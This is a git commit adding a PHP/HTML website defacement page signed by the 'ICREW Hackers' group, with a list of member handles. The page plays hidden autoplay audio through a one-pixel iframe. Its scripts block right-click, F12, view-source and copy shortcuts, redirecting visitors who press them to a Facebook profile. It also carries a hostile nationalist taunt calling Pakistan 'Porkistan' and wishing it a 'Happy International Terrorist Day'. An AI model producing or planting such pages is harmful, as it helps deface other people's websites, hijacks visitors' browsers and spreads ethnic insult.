86253c8d098b8542e0d937706bad0092a30c7ea3
knightrider27 <43331357+knightrider27@users.noreply.github.com>
2020-08-13 23:31:30 -0700

    india.php

---
+++ india.php
@@ -0,0 +1,422 @@
+
+
+<html>
+    <head>
+<link href="https://fonts.googleapis.com/css?family=Berkshire+Swash|Kurale|Marcellus|Oranienbaum|Amaranth" rel="stylesheet">
+<link rel="shortcut icon" href="https://i.ibb.co/P6dtgq7/i-crew.png">
+        <title>::Hacked By ICREW HACKERS::</title>
+		<iframe frameborder="0" height="1" width="1" loop="true" allow="autoplay" src="https://dl.dropbox.com/s/qpjvdjhmb4cgzll/maa%20tuje%20salam.mp3?dl=0"></iframe>
+        <meta property="og:image" content="https://i.ibb.co/P6dtgq7/i-crew.png">
+        <meta name="description" content="HACKED BY  TEAM ICREW HACKERS">
+        <meta name="keywords" content="hacker,black hat,INDIAN hacker,Kerala Hackers,White hat,Gray Hat,Against Terrorism,Independance day,Team ICREW Hackers,I CREW">
+        <meta name="author" content="4N1GH7_R1D3R">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+	<meta charset="UTF-8">
+    <style type="text/css">
+#selector {
+       cursor: none;
+    }
+        body {
+	cursor: none;
+    text-align:center;
+    background-color:black;
+    background: url(https://i.ibb.co/T899pc5/dark-wallpaper-5.jpg);background-repeat: no-repeat; background-position: center; background-repeat: no-repeat; background-size: cover;">
+
+}
+
+
+    #arohi
+      {
+  text-align: center;
+  font-family: 'Monospace', Monospace;
+  -webkit-animation: noise-3 1s linear infinite;
+          animation: noise-3 1s linear infinite;
+  overflow: default;
+}
+
+
+@-webkit-keyframes noise-1 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: -6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: 2px;}
+}
+
+@keyframes noise-1 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: -6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: 2px;}
+}
+
+@-webkit-keyframes noise-2 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: 6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: -2px;}
+}
+
+@keyframes noise-2 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: 6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: -2px;}
+}
+
+@-webkit-keyframes noise {
+  0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}
+  4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);}
+  43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}
+}
+
+@keyframes noise {
+  0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}
+  4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);}
+  43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}
+}
+
+@-webkit-keyframes noise-3 {
+  0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}
+  4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);}
+  43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate(60deg);}
+}
+
+@keyframes noise-3 {
+  0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}
+  4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);}
+  43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate(60deg);}
+
+    }
+
+
+#adu {
+    color:white;
+    text-shadow:0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red,0px 0px 3px red;
+    font-family: 'Berkshire Swash', cursive;
+}
+#arohi {
+    color:white;
+    text-shadow:0px 0px 3px green,0px 0px 3px blue,0px 0px 3px green,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px green,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px green,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px green,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px green,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px green;
+    font-family: 'Kurale', serif;
+}
+#nisat {
+    color:black;
+    text-shadow:0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white;
+    font-family: 'Berkshire Swash', cursive;
+	font-size:26px;
+		}
+#nisat1 {
+    color:black;
+    text-shadow:0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white;
+	font-size:28px;
+    font-family: 'Berkshire Swash', cursive;
+		}
+
+#babuta {
+    color:white;
+    text-shadow:0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue,0px 0px 3px black,0px 0px 3px green,0px 0px 3px blue;
+    font-family: 'Kurale', serif;
+}
+footer {
+    color:white;
+    font-family: 'Amaranth', sans-serif;
+    text-shadow:0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue,0px 0px 1px blue;
+    font-size:12px;
+}
+marquee {
+    color:red;
+}
+#valobasi {
+    color:white;
+    text-shadow:0px 0px 2px green,0px 0px 2px blue,0px 0px 2px green;
+    font-family: 'Kurale', serif;
+}
+#aduarohiforever {
+    color:white;
+    font-size:20px;
+    text-shadow:0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red;
+}
+		
+		
+		@keyframes spin {
+ from{
+ transform: rotateY(0deg);
+ moz-transform: rotateY(0deg); //Firefox
+ ms-transform: rotateY(0deg); //Microsoft Browsers
+ }
+ to{
+ transform: rotateY(360deg);
+ moz-transform: rotateY(360deg); //Firefox
+ ms-transform: rotateY(360deg); //Microsoft Browsers
+ }
+}
+@-webkit-keyframes spin{
+ from{-webkit-transform: rotateY(0deg);}
+ to{-webkit-transform: rotateY(360deg);}
+}
+.imageSpin{
+ animation-name: spin;
+ animation-timing-function: linear;
+ animation-iteration-count: infinite;
+ animation-duration: 5s;
+ -webkit-animation-name: spin;
+ -webkit-animation-timing-function: linear;
+ -webkit-animation-iteration-count: infinite;
+ -webkit-animation-duration: 5s;
+}
+
+.India {
+  background-image: url("https://www.crossed-flag-pins.com/animated-flag-gif/gifs/India_240-animated-flag-gifs.gif");
+  
+    background-position:center center;
+  background-size:570px 300px;
+  -webkit-text-fill-color: transparent;
+  -webkit-background-clip: text;
+  font-size: 40px;
+  font-weight: bold;
+ font-family: 'Lobster', cursive;
+  
+  font-weight: normal;
+  padding-top: 10px;
+  text-align: center;
+
+  text-align: center;
+ 
+}
+		
+		
+ @media only screen and (min-height: 500px)
+	 
+	 #terror{
+	font-size: 30px !important;
+ }
+}
+#terror{
+	color:black;
+    text-shadow:0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white,0px 0px 1px white;
+    font-family: 'Berkshire Swash', cursive;
+	font-size: 35px;
+	 
+    </style>
+		
+		
+		
+		
+	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.0.3/howler.min.js"></script>
+  
+<script type="text/javascript">
+new TypingText(document.getElementById("pesan"), 70, function(i){ var ar
+= new Array("|","|","|","|"); return "" + ar[i.length % ar.length]; });
+//Type out examples:
+TypingText.runAll();
+</script>
+ <script type="text/javascript">
+  shortcut = {
+    all_shortcuts: {},
+      add: function (e, t, n) {
+        var r = {
+          type: "keydown",
+          propagate: !1,
+          disable_in_input: !1,
+          target: document,
+          keycode: !1
+        };
+        if (n) for (var i in r) "undefined" == typeof n[i] && (n[i] = r[i]);
+        else n = r;
+        r = n.target, "string" == typeof n.target && (r = document.getElementById(n.target)), e = e.toLowerCase(), i = function (r) {
+          r = r || window.event;
+          if (n.disable_in_input) {
+            var i;
+            r.target ? i = r.target : r.srcElement && (i = r.srcElement), 3 == i.nodeType && (i = i.parentNode);
+            if ("INPUT" == i.tagName || "TEXTAREA" == i.tagName) return
+          }
+          r.keyCode ? code = r.keyCode : r.which && (code = r.which), i = String.fromCharCode(code).toLowerCase(), 188 == code && (i = ","), 190 == code && (i = ".");
+          var s = e.split("+"),
+            o = 0,
+            u = {
+              "`": "~",
+              1: "!",
+              2: "@",
+              3: "#",
+              4: "$",
+              5: "%",
+              6: "^",
+              7: "&",
+              8: "*",
+              9: "(",
+              0: ")",
+              "-": "_",
+              "=": "+",
+              ";": ":",
+              "'": '"',
+              ",": "<",
+              ".": ">",
+              "/": "?",
+              "\": "|"
+            }, f = {
+              esc: 27,
+              escape: 27,
+              tab: 9,
+              space: 32,
+              "return": 13,
+              enter: 13,
+              backspace: 8,
+              scrolllock: 145,
+              scroll_lock: 145,
+              scroll: 145,
+              capslock: 20,
+              caps_lock: 20,
+              caps: 20,
+              numlock: 144,
+              num_lock: 144,
+              num: 144,
+              pause: 19,
+              "break": 19,
+              insert: 45,
+              home: 36,
+              "delete": 46,
+              end: 35,
+              pageup: 33,
+              page_up: 33,
+              pu: 33,
+              pagedown: 34,
+              page_down: 34,
+              pd: 34,
+              left: 37,
+              up: 38,
+              right: 39,
+              down: 40,
+              f1: 112,
+              f2: 113,
+              f3: 114,
+              f4: 115,
+              f5: 116,
+              f6: 117,
+              f7: 118,
+              f8: 119,
+              f9: 120,
+              f10: 121,
+              f11: 122,
+              f12: 123
+            }, l = !1,
+            c = !1,
+            h = !1,
+            p = !1,
+            d = !1,
+            v = !1,
+            m = !1,
+            y = !1;
+          r.ctrlKey && (p = !0), r.shiftKey && (c = !0), r.altKey && (v = !0), r.metaKey && (y = !0);
+          for (var b = 0; k = s[b], b < s.length; b++) "ctrl" == k || "control" == k ? (o++, h = !0) : "shift" == k ? (o++, l = !0) : "alt" == k ? (o++, d = !0) : "meta" == k ? (o++, m = !0) : 1 < k.length ? f[k] == code && o++ : n.keycode ? n.keycode == code && o++ : i == k ? o++ : u[i] && r.shiftKey && (i = u[i], i == k && o++);
+          if (o == s.length && p == h && c == l && v == d && y == m && (t(r), !n.propagate)) return r.cancelBubble = !0, r.returnValue = !1, r.stopPropagation && (r.stopPropagation(), r.preventDefault()), !1
+        }, this.all_shortcuts[e] = {
+          callback: i,
+          target: r,
+          event: n.type
+        }, r.addEventListener ? r.addEventListener(n.type, i, !1) : r.attachEvent ? r.attachEvent("on" + n.type, i) : r["on" + n.type] = i
+      },
+      remove: function (e) {
+        var e = e.toLowerCase(),
+          t = this.all_shortcuts[e];
+        delete this.all_shortcuts[e];
+        if (t) {
+          var e = t.event,
+            n = t.target,
+            t = t.callback;
+          n.detachEvent ? n.detachEvent("on" + e, t) : n.removeEventListener ? n.removeEventListener(e, t, !1) : n["on" + e] = !1
+        }
+      }
+    },
+     shortcut.add("Ctrl+U",function(){
+     window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+    }),
+     shortcut.add("Meta+Alt+U",function(){
+     window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+    }),
+    shortcut.add("Ctrl+C",function(){
+     window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+    }),
+    shortcut.add("Meta+C",function(){
+     window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+    });
+  </script>
+  <script>
+var isNS = (navigator.appName == "Netscape") ? 1 : 0;
+
+if(navigator.appName == "Netscape") document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+
+function mischandler(){
+return false;
+}
+
+function mousehandler(e){
+var myevent = (isNS) ? e : event;
+var eventbutton = (isNS) ? myevent.which : myevent.button;
+if((eventbutton==2)||(eventbutton==3))
+window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+}
+document.oncontextmenu = mischandler;
+document.onmousedown = mousehandler;
+document.onmouseup = mousehandler;
+
+</script>
+<script language="JavaScript">
+
+//////////F12 disable code////////////////////////
+    document.onkeypress = function (event) {
+        event = (event || window.event);
+        if (event.keyCode == 123) {
+           //alert('No F-12');
+            return false;
+        }
+    }
+    document.onmousedown = function (event) {
+        event = (event || window.event);
+        if (event.keyCode == 123) {
+           window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+            return false;
+        }
+    }
+document.onkeydown = function (event) {
+        event = (event || window.event);
+        if (event.keyCode == 123) {
+            window.location = "https://www.facebook.com/profile.php?id=100040253345492";
+            return false;
+        }
+    }
+/////////////////////end///////////////////////
+</script>
+    </head>
+    <body>
+		<link href='https://fonts.googleapis.com/css?family=Lobster' rel='stylesheet' type='text/css'>
+		
+        <div class ="India">
+        H4CK3D BY <br>-::| ICREW Hackers |::-
+	  </div>
+        <img src="https://i.ibb.co/P6dtgq7/i-crew.png" height="200px" width="250px" class="imageSpin"/>
+        <marquee scrollamount="50" direction="left"><font color="orange">
+<===============================================================>
+			</font></marquee>
+			
+        <h2 id="babuta">Here is a special wish to "Porkistan" On their Very speical day </h2>
+		<link href='https://fonts.googleapis.com/css?family=Kavoon' rel='stylesheet' type='text/css'>
+			<h1 id="nisat">Happy </br></h1><h1 id="nisat1"> International <font color="red"> "Terrorist"</font> Day!!!</h1>
+        <!--<img src="http://shellerim.org/site-resimleri/kirmizi-cizgi.png" width="100%" height="2px">-->
+		
+		        <marquee scrollamount="50" direction="right"><font color="blue"><span style="color: green;">
+<===============================================================>
+					</span>
+					</span></span></font></marquee>
+        <h3 id="valobasi">WE ARE</h3>
+		<center><font size="4" color="white" face="Tahoma" ></font><marquee direction=left behavior=alternate scrollamount="8" scrolldelay="30"><font color="white" face="verdana"><font size=4 color="c0c0c0"> <font face="Monospace" size="4" style="color: White; text-shadow: 0px 1px 12px aqua;background:url('http://shellerim.org/site-resimleri/yildiz.gif');"><b> | PR4N4V_K1CHU | 4L0N3_5N1P3R  | 44DH1 KR15HN4 | GH057_5P3C706 | V4UL7_BR34K3R | V4LY3774N R007 | Bl4CK_B346D | 4N1GH7_R1D3R | R3G4N_BLU | A6JUN_N47H | 1YNX K1DDI3 | 0V3RD0SE | H45H_C47 | R007_5P1D3R | CY83R_V3N0M | 4N0N_R007  | CRYP70_C1PH3R | S1DH467H_N4NDH4N |
+		 </font></div><br></font></font></marquee><p align="center"><b></center><center>
+
+        <footer>&#169; ICREW Hackers 2020</footer>
+        
+    </body>
+</html>
